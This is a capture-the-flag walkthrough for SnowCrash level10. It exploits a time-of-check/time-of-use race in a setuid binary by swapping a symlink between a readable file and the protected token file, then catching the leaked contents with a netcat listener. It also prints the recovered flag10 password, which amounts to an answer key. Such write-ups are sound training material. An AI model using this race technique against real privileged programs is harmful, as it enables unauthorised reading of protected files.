## 1. Connect to level10:

```bash
level09@SnowCrash:~$ su level10
password: *use previously found flag*
```

## 2. See existing files:

```bash
level10@SnowCrash:~$ ls -l
    total 16
    -rwsr-sr-x+ 1 flag10 level10 10817 Mar  5  2016 level10
    -rw-------  1 flag10 flag10     26 Mar  5  2016 token
```

## 3. Test out the `level10` program:

```bash
level10@SnowCrash:~$ ./level10
	./level10 file host
		sends file to host if you have access to it

level10@SnowCrash:~$ ./level10 token localhost
	You don't have access to token

level10@SnowCrash:~$ ./level10 .profile localhost
	Connecting to localhost:6969 .. Unable to connect to host localhost
```

## 4. Create a script that will open the token file

```bash
level10@SnowCrash:~$ cd /tmp
level10@SnowCrash:~$ touch race.sh
```

*See level10/Ressources/race.sh*

The script creates 2 files for which we have the rights to read:
    - a `random file`
    - a `link file`

First, the script runs the `level10` binary in an infinite loop, redirecting its output to `/dev/null`.

Then, it alterns the link to the `random file` and the `token` file in an infinite loop.

*If we download the `level10` binary file and look at its main, we can find the access() function used to open the files. This function is known to take a certain time to 1/ check the rights on the file, 2/ open the file if rights allow it (see `man access`).
Our script is going to take advantage of the small window between those 2 steps to try to open the `token` file and use the `random file`s reading rights.*


## 5. Run the script:

```bash
level10@SnowCrash:~$ chmod +x /tmp/race.sh
level10@SnowCrash:~$ /tmp/race.sh
```

## 6. On another terminal, run the race condition:
```bash
while true;  do nc -l 6969 | grep -v '.*( )*.' ; done
```

This will make the content of the files appear on the terminal as long as the loops are running. It will also remove all appearance of '.*( )*.' that pollute the terminal.
You should obtain your password !

## 7. Login into *`flag10`* user account with obtained password:
```bash
level10@SnowCrash:~$ su flag10
password: woupa2yuojeeaaed06riuj63c
```

## 8. Use `getflag` command to get flag for level11:

```bash
flag10@SnowCrash:~$ getflag
```